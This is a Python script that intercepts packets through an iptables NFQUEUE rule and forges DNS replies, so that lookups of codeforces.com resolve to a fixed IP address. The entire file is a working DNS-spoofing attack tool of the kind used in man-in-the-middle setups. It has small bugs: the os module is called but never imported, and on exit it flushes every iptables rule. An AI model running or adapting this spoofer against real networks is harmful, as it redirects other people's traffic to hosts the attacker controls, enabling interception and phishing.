#!/usr/bin/env python

import scapy.all as scapy
from urllib import unquote
import time,sys,re,netfilterqueue,subprocess

def enable_ip_forward():
	# Enables IP Forward in linux
	file_path = "/proc/sys/net/ipv4/ip_forward"
	f = open(file_path,"w")
	f.write('1')
	f.close()
def proc_of_pkt(packet):
	scapy_pkt = scapy.IP(packet.get_payload())
	if scapy_pkt.haslayer(scapy.DNSRR):
		ip_layer = scapy_pkt.getlayer(scapy.IP)
		print("[+] New Packet: {src} -> {dst}".format(src = ip_layer.src, dst = ip_layer.dst))
		qname = scapy_pkt[scapy.DNSQR].qname
		if "codeforces.com" in qname:
			print("[ ] Spoofing codeforces.com -> 140.113.207.246")
			scapy_pkt[scapy.DNS].an = scapy.DNSRR(rrname = qname,rdata = "140.113.207.246")
			scapy_pkt[scapy.DNS].ancount = 1

			del scapy_pkt[scapy.IP].len
			del scapy_pkt[scapy.IP].chksum
			del scapy_pkt[scapy.UDP].chksum
			del scapy_pkt[scapy.UDP].len
			packet.set_payload(str(scapy_pkt))
	packet.accept()

def main():
	if os.geteuid() != 0:
		print("./pkt_intercepting.py: Permission denied")
		print("Try sudo ./pkt_intercepting.py")
		return
	try:
		enable_ip_forward()
		print("[*] Packet intercepting...")
		subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num","0"])
		
		nfqueue = netfilterqueue.NetfilterQueue()
		nfqueue.bind(0,proc_of_pkt)
		nfqueue.run()
	except KeyboardInterrupt:
		subprocess.call(["iptables","--flush"])
		print("\n[!] Stop Packet intercepting.")
	
	

if __name__ == '__main__':
	main()
